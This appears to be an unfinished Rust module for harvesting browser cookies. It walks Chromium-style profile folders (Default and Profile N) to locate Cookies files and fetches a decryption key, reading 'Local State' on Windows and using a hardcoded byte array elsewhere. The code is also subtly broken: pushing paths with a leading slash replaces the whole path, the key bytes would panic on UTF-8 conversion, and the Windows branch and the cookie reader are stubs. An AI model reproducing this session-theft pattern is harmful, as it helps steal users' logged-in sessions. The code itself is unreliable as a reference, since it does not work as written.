use std::os::linux::fs::MetadataExt;
use std::path::PathBuf;

pub async fn get_cookies(path: &mut PathBuf) {
    // checking if browser is installed or not
    if let Err(_) = tokio::fs::read_dir(&path).await {
        return;
    }

    let key = get_encrypted_key(path.clone());

    // check default profile
    path.push("/Default");
    get_cookies_linux(path).await;
    path.pop();
    // loop through all other profiles
    let mut list = tokio::fs::read_dir(&path).await.unwrap();
    while let Ok(dir_entry_unknown) = list.next_entry().await {
        if let Some(dir_entry) = dir_entry_unknown {
            if let Some(entry) = dir_entry.file_name().to_str() {
                if !entry.contains("Profile") {
                    break;
                }
            }
            path.push(dir_entry.file_name());
            get_cookies_linux(path).await;
            path.pop();
        } else {
            break;
        }
    }
}

pub async fn get_encrypted_key(mut key_path: PathBuf) -> String {
    if cfg!(target_os = "windows") {
        key_path.push("/Local State");

        if let Ok(encrypted_key) = tokio::fs::read_to_string(key_path).await {
            // deserialize master_key
        }
        todo!()
    } else {
        let key: Vec<u8> = vec![
            0x76, 0x31, 0x31, 0xB9, 0xBA, 0xC6, 0x4A, 0x63, 0x4A, 0xE5, 0x31, 0xD2, 0xBA, 0xF0,
            0x29, 0xCF, 0x8F, 0x49, 0xEC, 0xF8, 0x0A, 0xBA, 0x90, 0xC1, 0x27, 0xB7, 0xB6, 0xB0,
            0x2C, 0x50, 0xDA, 0x8C, 0xBA, 0x9B, 0x08, 0x4F, 0xFE, 0x7E, 0x7B, 0x93, 0xC5, 0xEA,
            0x5F, 0x87, 0x6A, 0x6A, 0x7C, 0x38, 0x49, 0x72, 0x58, 0x1C, 0x18, 0xF3, 0x22, 0xCA,
            0x16, 0x2B, 0xF7, 0xBD, 0x64, 0x18, 0x32, 0x30, 0xFB, 0x06, 0x92, 0x5C, 0x3C, 0x98,
            0x74, 0xBD, 0xD6, 0x81, 0x67, 0x45, 0x9B, 0x28, 0xCF, 0xEA, 0x8A, 0x16, 0xF2,
        ];
        return String::from_utf8(key).unwrap();
    }
}

pub async fn get_cookies_linux(path: &mut PathBuf) {
    path.push("/Cookies");
    if let Ok(f) = std::fs::metadata(path.as_os_str()) {
        if f.st_size() == 0 {
            return;
        }
    }
}
